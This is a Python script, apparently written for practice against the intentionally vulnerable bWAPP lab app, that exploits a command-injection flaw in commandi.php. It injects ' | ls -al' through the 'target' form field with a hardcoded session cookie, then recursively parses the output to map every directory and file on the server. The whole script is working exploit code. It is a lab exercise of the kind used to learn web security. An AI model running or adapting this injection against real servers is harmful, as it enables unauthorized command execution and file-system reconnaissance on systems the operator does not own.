import requests
from bs4 import BeautifulSoup
import openpyxl
from openpyxl import Workbook
    
headers = {
"Referrer": "http://192.168.96.142/bWAPP/commandi.php",
"Cookie" : "PHPSESSID=4195147d4ffc993e5191b0a155f081ab; security_level=0"
}
data = {
    "target" : " | ls -al",
    "form" : "submit"    
    }


#1. 일단 html연결하고 파싱할 데이터 들고오기
def Get(directory_name):

    data['target'] = f" | ls -al {directory_name}"
    response = requests.post("http://192.168.96.142/bWAPP/commandi.php", headers=headers, data=data)
    if response.status_code == 200:
        html = response.text
        return BeautifulSoup(html, 'html.parser')
    else:
        print("Error fetching HTML:", response.status_code)
        return None
    
    

#2. 결과로부터 디렉토리 목록을 파싱하는 함수
def parse_directories(directory_name,depth=1):
    soup = Get(directory_name)
    dir_listing = soup.select_one('p[align="left"]')
    
    result = []
    
    if dir_listing:
        split_dir = dir_listing.text.split('\n') #list

        for line in split_dir :

            if line.strip() and line.startswith('d')and not line.endswith('.'): #디렉토리면!!!
                parts = line.split()
                dir_name = parts[-1]
                result.append(dir_name)        
                sub_result = parse_directories(dir_name, depth + 1)  # 재귀 호출
                if sub_result is not None:  # 반환값이 None이 아니면 결과에 추가
                    result.extend(sub_result) 

            elif line.strip() and not line.endswith('.'):  # 빈 줄이 아닌 경우에만 처리
                parts = line.split()
                file_name = parts[-1]
                result.append((f"{file_name}", directory_name))
                    
    else : print(f"HTML 파싱 실패!!: {directory_name},{depth}, 디렉토리명 : {directory_name}")

    """ result_dir = {}
    for item in result:
        file_name, parent_dir = item
        if file_name == '.':
            result_dir[file_name] = '.'
        else :
            result_dir[file_name] = parent_dir """
    print(result)
    return result


parse_directories('.',depth=1)
    



'''
# 메인 함수
def main():
    a =parse_directories('.',depth=1)
    book = openpyxl.Workbook()
    sheet = book.active
    sheet.append(a)
    book.save("result.xlsx")
    book.close()

if __name__ == "__main__":
    main()
'''
